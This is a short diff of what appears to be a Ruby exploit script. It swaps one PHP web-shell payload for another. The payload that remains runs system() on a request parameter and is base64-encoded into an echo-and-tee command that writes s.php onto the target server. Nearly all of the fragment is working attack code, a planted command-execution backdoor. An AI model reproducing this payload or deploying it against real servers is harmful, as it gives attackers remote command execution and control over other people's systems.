@@ -45,8 +45,7 @@ end
 
 
 # Payload (we could just be happy with this, but we can do better!)
-#evil = '<?php ; ?>'
-evil = '<?php if( isset( $_REQUEST["c"] ) ) { eval( $_GET[c]) ); } ?>'
+#evil = '<?php if( isset( $_REQUEST["c"] ) ) { eval( $_GET[c]) ); } ?>'
 evil = '<?php if( isset( $_REQUEST["c"] ) ) { system( $_REQUEST["c"] . " 2>&1" ); }'
 evil = "echo " + Base64.strict_encode64(evil).strip + " | base64 -d | tee s.php"
 
